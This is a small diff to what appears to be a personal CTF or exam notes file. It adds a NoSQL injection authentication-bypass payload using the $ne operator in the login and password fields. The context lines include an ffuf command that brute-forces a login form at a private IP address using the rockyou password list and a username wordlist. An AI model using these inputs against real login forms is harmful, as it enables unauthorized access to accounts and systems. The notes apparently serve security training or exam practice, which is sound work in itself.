@@ -9,6 +9,12 @@ use 3
 info 3
 
 
+exam:
+
+No SQL Database trick:
+login[$ne]=1223&passwd[$ne]=123
+
+
 47
 
 ffuf -u http://10.8.32.1:42791 -X POST -d "login=FFUZ1&passwd=FUZZ" -w /usr/share/wordlists/rockyou.txt:FUZZ -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -fs 821
